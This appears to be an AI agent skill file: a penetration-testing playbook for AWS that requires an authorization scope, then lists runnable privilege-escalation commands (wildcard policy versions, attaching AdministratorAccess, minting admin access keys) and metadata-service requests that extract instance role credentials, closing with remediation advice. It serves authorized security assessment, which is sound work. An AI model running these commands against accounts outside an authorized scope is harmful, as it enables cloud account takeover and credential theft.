---
name: cloud-aws-iam-privesc
description: AWS IAM privilege escalation, STS assume-role chaining, IMDSv1/IMDSv2 credential extraction, S3 bucket resource policy auditing, and Lambda execution role abuse.
---

# AWS Cloud IAM Privilege Escalation & Metadata Abuse

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Confirm target AWS account ID, resource ARNs, and assessment boundaries in `.hacker-harness/scope.yaml`.
- **Target Credentials / Tokens:** Initial low-privilege IAM user keys, session tokens, or instance metadata access.
- **Traffic Routing:** Route AWS API calls or HTTP probes through Caido proxy or local intercepting proxy where applicable.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Caller Identity & Permission Enumeration
Identify the current principal and attached permissions:
```bash
# Get caller identity
aws sts get-caller-identity

# Enumerate user policies
aws iam list-user-policies --user-name <username>
aws iam list-attached-user-policies --user-name <username>

# Enumerate role policies if running as assumed role
aws iam list-role-policies --role-name <role-name>
aws iam list-attached-role-policies --role-name <role-name>
```

### Step 2: High-Risk IAM Privilege Escalation Paths
Check for any of the 21 classic IAM escalation primitives:
1. **`iam:CreatePolicyVersion` / `iam:SetDefaultPolicyVersion`:** Create a new wildcard policy version and set as default.
   ```bash
   aws iam create-policy-version --policy-arn <arn> --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default
   ```
2. **`iam:AttachUserPolicy` / `iam:AttachRolePolicy`:** Attach `AdministratorAccess` directly to the caller principal.
   ```bash
   aws iam attach-user-policy --user-name <username> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
   ```
3. **`iam:PutUserPolicy` / `iam:PutRolePolicy`:** Inline wildcard policy injection.
4. **`iam:CreateAccessKey`:** Generate new access key for a higher-privileged user.
   ```bash
   aws iam create-access-key --user-name <admin-user>
   ```
5. **`iam:PassRole` + `lambda:CreateFunction` / `lambda:InvokeFunction`:** Pass an administrator execution role to a temporary serverless function to execute arbitrary commands.

### Step 3: EC2 Instance Metadata Service (IMDS) Extraction
Probe for exposed or proxied metadata endpoints:
```http
# IMDSv1 (Direct GET without token)
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254

# IMDSv2 (Token-gated PUT + GET)
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```
Then fetch credentials with the token:
```http
GET /latest/meta-data/iam/security-credentials/{role-name} HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: <token-from-put>
```

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Technique | Common Root Cause | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **SSR-Driven IMDS Leak** | Unrestricted webhook/fetcher URL | Webhook accepts `http://169.254.169.254/latest/meta-data/` | `"AccessKeyId": "ASIA..."` in response body |
| **S3 Bucket Takeover** | Dangling DNS / Missing bucket policy | CNAME points to `target-assets.s3.amazonaws.com` | `NoSuchBucket` HTTP 404 $\rightarrow$ bucket claim |
| **Cognito Identity Pool Misconfig** | Unauthenticated role has `iam:*` or `s3:*` | Cognito `GetId` + `GetCredentialsForIdentity` returns admin credentials | Temporary STS tokens with unrestricted actions |
| **Lambda Env Secret Leak** | Plaintext secrets in function env | `lambda:GetFunctionConfiguration` reveals DB passwords / API keys | `Environment.Variables` JSON object |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture raw AWS CLI command output or HTTP request/response containing temporary token generation or policy mutation.
2. **Impact Proof:** Execute a read-only privileged call (`aws s3 ls` or `aws iam list-users`) using the escalated principal to verify effective elevation.
3. **Remediation:** Apply least-privilege IAM boundaries, enforce IMDSv2 with hop-limit=1, and restrict `iam:PassRole` resource scoping.
